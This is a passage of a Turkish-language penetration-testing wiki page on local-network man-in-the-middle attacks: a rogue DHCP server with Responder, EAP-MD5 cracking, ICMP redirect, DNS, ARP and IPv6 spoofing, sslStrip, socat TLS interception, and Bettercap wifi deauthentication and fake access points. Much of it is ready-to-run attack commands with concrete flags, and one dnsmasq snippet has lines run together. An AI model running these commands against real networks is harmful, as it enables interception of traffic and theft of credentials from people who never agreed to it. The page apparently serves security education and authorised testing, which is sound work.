Kötü amaçlı bir DHCP server, `/usr/share/responder/DHCP.py` konumundaki DHCP script'i kullanılarak kurulabilir. Bu, trafiği kötü amaçlı bir sunucuya yönlendirerek HTTP trafiği ve kimlik bilgilerini yakalamak gibi network saldırıları için faydalıdır. Ancak bir rogue gateway ayarlamak daha az etkili olabilir çünkü bu yalnızca istemciden çıkan trafiği yakalamaya izin verir ve gerçek gateway'in yanıtlarını kaçırır. Bunun yerine, daha etkili bir saldırı için rogue bir DNS veya WPAD server kurulması önerilir.

Aşağıda rogue DHCP server'ı yapılandırmak için komut seçenekleri verilmiştir:

- **Our IP Address (Gateway Advertisement)**: Makinenizin IP'sini ağ geçidi olarak duyurmak için `-i 10.0.0.100` kullanın.
- **Local DNS Domain Name**: İsteğe bağlı olarak yerel DNS alan adını ayarlamak için `-d example.org` kullanın.
- **Original Router/Gateway IP**: Meşru router veya ağ geçidinin IP adresini belirtmek için `-r 10.0.0.1` kullanın.
- **Primary DNS Server IP**: Kontrol ettiğiniz rogue DNS sunucusunun IP adresini ayarlamak için `-p 10.0.0.100` kullanın.
- **Secondary DNS Server IP**: İsteğe bağlı olarak ikincil DNS sunucu IP'si ayarlamak için `-s 10.0.0.1` kullanın.
- **Netmask of Local Network**: Yerel ağ için netmask'ı tanımlamak üzere `-n 255.255.255.0` kullanın.
- **Interface for DHCP Traffic**: Belirli bir ağ arayüzünde DHCP trafiğini dinlemek için `-I eth1` kullanın.
- **WPAD Configuration Address**: Web trafiğinin yakalanmasına yardımcı olmak için WPAD yapılandırma adresini ayarlamak üzere `-w “http://10.0.0.100/wpad.dat”` kullanın.
- **Spoof Default Gateway IP**: Varsayılan ağ geçidi IP adresini spoof etmek için `-S` ekleyin.
- **Respond to All DHCP Requests**: Sunucunun tüm DHCP isteklerine yanıt vermesini sağlamak için `-R` ekleyin, ancak bunun gürültülü olduğunu ve tespit edilebileceğini unutmayın.

Bu seçenekleri doğru kullanarak, ağ trafiğini etkili şekilde yakalamak için bir kötü amaçlı DHCP sunucusu kurulabilir.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Saldırıları**

Here are some of the attack tactics that can be used against 802.1X implementations:

- EAP üzerinden aktif brute-force parola kırma
- RADIUS sunucusuna malformed EAP içeriği ile saldırma _\*\*_(exploits)
- EAP mesaj yakalama ve çevrimdışı parola kırma (EAP-MD5 ve PEAP)
- TLS sertifika doğrulamasını atlamak için EAP-MD5 kimlik doğrulamasını zorlamak
- Hub veya benzeri kullanarak kimlik doğrulanınca kötü amaçlı ağ trafiği enjekte etme

If the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Saldırıları <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) sıcak yedekli bir yönlendirme sistemi oluşturmak için tasarlanmış bir ağ protokolleri sınıfıdır. FHRP ile fiziksel yönlendiriciler tek bir mantıksal cihaz halinde birleştirilebilir; bu, hata toleransını artırır ve yükün dağıtılmasına yardımcı olur.

**Cisco Systems mühendisleri iki FHRP protokolü geliştirmiştir: GLBP ve HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Routing Information Protocol (RIP) üç sürümde bilinir: RIP, RIPv2 ve RIPng. RIP ve RIPv2 ile datagramlar UDP üzerinden port 520'ye gönderilirken, RIPng ile datagramlar IPv6 multicast üzerinden UDP port 521'e yayınlanır. RIPv2, MD5 kimlik doğrulamasını desteklemeye başlarken, RIPng yerel bir kimlik doğrulama içermez; bunun yerine IPv6 içinde isteğe bağlı IPsec AH ve ESP başlıklarına dayanır.

- **RIP ve RIPv2:** İletişim UDP datagramları aracılığıyla port 520 üzerinden yapılır.
- **RIPng:** Datagramları IPv6 multicast ile UDP port 521 üzerinden yayınlar.

RIPv2'nin MD5 kimlik doğrulamasını desteklediğini, RIPng'nin ise yerel bir kimlik doğrulama içermeyip IPv6'daki IPsec AH ve ESP başlıklarına dayandığını unutmayın.

### EIGRP Saldırıları

**EIGRP (Enhanced Interior Gateway Routing Protocol)** dinamik bir yönlendirme protokolüdür. **Bu bir uzaklık-vektör protokolüdür.** Eğer kimlik doğrulama ve passive interface yapılandırması yoksa, bir **saldırgan** EIGRP yönlendirmesine müdahale edebilir ve **yönlendirme tablolarının zehirlenmesine** yol açabilir. Ayrıca, EIGRP ağı (başka bir deyişle özerk sistem) düz bir yapıya sahiptir ve herhangi bir zone'a ayrılmamıştır. Eğer bir **saldırgan bir rota enjekte ederse**, bu rotanın özerk EIGRP sistemi boyunca **yayılarak** yayılması muhtemeldir.

Bir EIGRP sistemine saldırmak, meşru bir EIGRP router ile **komşuluk (neighbourhood)** kurmayı gerektirir; bu da temel keşiften çeşitli enjeksiyonlara kadar birçok olanağı açar.

[**FRRouting**](https://frrouting.org/) sanal bir router uygulamanıza olanak tanır; BGP, OSPF, EIGRP, RIP ve diğer protokolleri destekler. Tek yapmanız gereken bunu saldırganın sistemine konuşlandırmak ve yönlendirme alanında meşru bir router gibi davranmaktır.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) EIGRP yayınlarını yakalama yeteneğine sahiptir. Ayrıca paket enjeksiyonuna izin verir; bu, yönlendirme yapılandırmalarını değiştirmek için kullanılabilir.

### OSPF

Open Shortest Path First (OSPF) protokolünde **MD5 kimlik doğrulaması** genellikle yönlendiriciler arasındaki güvenli iletişimi sağlamak için kullanılır. Ancak bu güvenlik önlemi Loki ve John the Ripper gibi araçlarla zayıflatılabilir. Bu araçlar MD5 hash'lerini yakalayıp kırabilir ve kimlik doğrulama anahtarını açığa çıkarabilir. Anahtar elde edildikten sonra yeni yönlendirme bilgileri eklemek için kullanılabilir. Rota parametrelerini yapılandırmak ve ele geçirilmiş anahtarı belirlemek için sırasıyla _Injection_ ve _Connection_ sekmeleri kullanılır.

- **MD5 Hash'lerini Yakalama ve Kırma:** Bu amaçla Loki ve John the Ripper gibi araçlar kullanılır.
- **Rota Parametrelerini Yapılandırma:** Bu işlem _Injection_ sekmesi üzerinden yapılır.
- **Ele Geçirilmiş Anahtarı Ayarlama:** Anahtar _Connection_ sekmesi altında yapılandırılır.

### Diğer Genel Araçlar & Kaynaklar

- [**Above**](https://github.com/c4s73r/Above): Ağ trafiğini taramak ve zafiyetleri bulmak için araç
- You can find some **more information about network attacks** [here](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Saldırgan, sahte DHCP yanıtları göndererek ağdaki yeni üyenin tüm ağ parametrelerini (GW, IP, DNS) yapılandırır.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Bakınız: [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect, attacker'ın bir IP'ye ulaşmanın en iyi yolu olduğunu belirten ICMP paketini (type 1 code 5) göndermesinden oluşur. Ardından victim, IP ile iletişim kurmak istediğinde paketi attacker üzerinden gönderir.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Saldırgan, kurbanın talep ettiği bazı (veya tüm) domains için çözümleme yapar.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq ile kendi DNS'inizi yapılandırın**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Yerel Ağ Geçitleri

Sistemlere ve ağlara genellikle birden fazla yol vardır. Yerel ağ içindeki MAC addresses listesini oluşturduktan sonra, IPv4 forwarding'i destekleyen hostları belirlemek için _gateway-finder.py_ kullanın.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS lookupları başarısız olduğunda yerel host çözümlemesi için Microsoft sistemleri **Link-Local Multicast Name Resolution (LLMNR)** ve **NetBIOS Name Service (NBT-NS)**'e güvenir. Benzer şekilde, **Apple Bonjour** ve **Linux zero-configuration** uygulamaları ağ içindeki sistemleri keşfetmek için **Multicast DNS (mDNS)** kullanır. Bu protokollerin kimlik doğrulama olmadan çalışması ve UDP üzerinden yayın mesajları göndermesi nedeniyle, kullanıcıları kötü amaçlı servislere yönlendirmeyi amaçlayan saldırganlar tarafından suistimal edilebilirler.

Responder kullanarak host'ların aradığı servisleri taklit edip sahte yanıtlar gönderebilirsiniz.\
Daha fazla bilgi için bakın: [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Tarayıcılar genellikle proxy ayarlarını otomatik olarak almak için **Web Proxy Auto-Discovery (WPAD)** protokolünü kullanır. Bu, yapılandırma detaylarının bir sunucudan, örneğin "http://wpad.example.org/wpad.dat" gibi bir URL üzerinden alınmasını içerir. İstemcilerin bu sunucuyu keşfetmesi çeşitli mekanizmalarla gerçekleşebilir:

- DHCP üzerinden; keşif özel bir 252 kodlu giriş kullanılarak sağlanır.
- DNS ile; yerel alan içinde _wpad_ adlı bir host adı aranır.
- Microsoft LLMNR ve NBT-NS aracılığıyla; bunlar DNS sorguları başarısız olduğunda kullanılan yedek mekanizmalardır.

Responder aracı, kötü amaçlı bir WPAD sunucusu gibi davranarak bu protokolden faydalanır. DHCP, DNS, LLMNR ve NBT-NS kullanarak istemcileri kendisine bağlanmaya kandırır. Responder kullanarak servislerin nasıl taklit edilebileceği hakkında daha fazla bilgi için [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Ağda farklı servisler sunarak bir kullanıcıyı bazı **düz metin kimlik bilgilerini** girmeye **kandırmaya** çalışabilirsiniz. **Bu saldırı hakkında daha fazla bilgi için** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

IPv6 Neighbor Spoofing

Bu saldırı, IPv6 dünyasında ARP Spoofing'e çok benzer. Kurbanın, GW'nin IPv6 adresinin saldırganın MAC adresine ait olduğunu düşünmesini sağlayabilirsiniz.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Bazı OS'ler, ağda gönderilen RA paketlerindeki gateway'i varsayılan olarak yapılandırır. attacker'ı IPv6 router olarak ilan etmek için şunu kullanabilirsiniz:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Varsayılan olarak bazı OS'ler ağdaki bir DHCPv6 paketi okuyarak DNS'i yapılandırmaya çalışır. Böylece bir saldırgan kendisini DNS olarak yapılandırmak için bir DHCPv6 paketi gönderebilir. DHCP ayrıca hedefe bir IPv6 sağlar.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

Temelde bu saldırının yaptığı şey şudur: eğer **user** bir **HTTP** sayfasına **access** etmeye çalışıp **redirecting** ile **HTTPS** versiyonuna yönlendiriliyorsa. **sslStrip** bir **HTTP connection with** the **client and** a **HTTPS connection with** the **server** **maintain** eder; böylece bağlantıyı **plain text** olarak **sniff** edebilir.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Daha fazla bilgi [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy ile HSTS atlatma

The **fark** between **sslStrip+ and dns2proxy** against **sslStrip** şudur: örneğin _**www.facebook.com**_ **_**to**_** _**wwww.facebook.com**_ (fazladan "**w**" olduğunu unutmayın) ve bu domainin **adresini attacker IP olarak ayarlarlar**. Bu şekilde **client** _**wwww.facebook.com**_ **(the attacker)**'a **connect** olacak, ancak arka planda **sslstrip+** gerçek bağlantıyı **https** üzerinden **www.facebook.com** ile **maintain** edecektir.

The **goal** of this technique is to **avoid HSTS** çünkü _**wwww**.facebook.com_ tarayıcının **cache**'ine kaydedilmeyecek, bu yüzden tarayıcı kandırılarak **facebook authentication in HTTP** gerçekleştirecektir.\
Not: bu saldırıyı gerçekleştirmek için hedefin başlangıçta [http://www.faceook.com](http://www.faceook.com) adresine http üzerinden erişmeye çalışması gerekir, https değil. Bu, bir http sayfası içindeki linkleri değiştirerek yapılabilir.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ artık çalışmıyor. Bunun sebebi tarayıcılarda önceden kaydedilmiş HSTS kurallarının bulunmasıdır; bu yüzden bir kullanıcının "önemli" bir domaine ilk kez erişmesi bile HTTPS üzerinden olacaktır. Ayrıca, önceden kaydedilmiş kuralların ve diğer oluşturulan kuralların [**`includeSubdomains`**](https://hstspreload.appspot.com) bayrağını kullanabileceğini unutmayın; bu yüzden daha önceki _**wwww.facebook.com**_ örneği artık işe yaramaz çünkü _**facebook.com**_ `includeSubdomains` ile HSTS kullanıyor.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP portta dinleme
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL portta dinleme

#### Anahtarlar ve kendi imzalı sertifika oluşturma
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Sertifika kullanarak dinleme
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Sertifika kullanarak dinleme ve hosts'a yönlendirme
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Bazen, client CA'nın geçerli olduğunu kontrol ediyorsa, **bir CA tarafından imzalanmış başka bir hostname'e ait certificate sunabilirsiniz**.\
Diğer ilginç bir test, istenen hostname'e ait **certificate'i self-signed olarak sunmaktır**.

Test edilmesi gereken diğer şeyler: certificate'i, geçerli görünen fakat gerçek bir CA olmayan bir certificate ile imzalamaya çalışmak. Ya da geçerli public key'i kullanıp diffie hellman gibi (gerçek private key ile hiçbir şeyi deşifre etmeye ihtiyaç duymayan) bir algoritmanın kullanılmasını zorlamak ve client gerçek private key'in bir probe'unu (örneğin bir hash) istediğinde sahte bir probe gönderip client'ın bunu kontrol etmediğini beklemek.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktif Keşif Notları

Bir UDP paketinin hedef cihazda istenen porta sahip olmayan bir cihaza gönderilmesi durumunda ICMP (Port Unreachable) gönderildiğini dikkate alın.

### **ARP keşfi**

ARP paketleri ağ içinde hangi IP'lerin kullanıldığını keşfetmek için kullanılır. PC, her olası IP adresi için bir istek göndermek zorundadır ve yalnızca kullanılmakta olan adresler yanıt verir.

### **mDNS (multicast DNS)**

Bettercap her X ms'de bir **\_services\_.dns-sd.\_udp.local** isteği gönderir; bu paketi gören makine genellikle bu isteğe yanıt verir. Daha sonra yalnızca "services" yanıtı veren makineleri arar.

**Araçlar**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap, 137/UDP portuna "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" adını soran broadcast paketleri gönderir.

### **SSDP (Simple Service Discovery Protocol)**

Bettercap, her türlü servisi aramak için SSDP broadcast paketleri gönderir (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap, servisleri aramak için WSD broadcast paketleri gönderir (UDP Port 3702).


### Telecom / Mobile-Core (GTP) İstismarı


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Referanslar

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
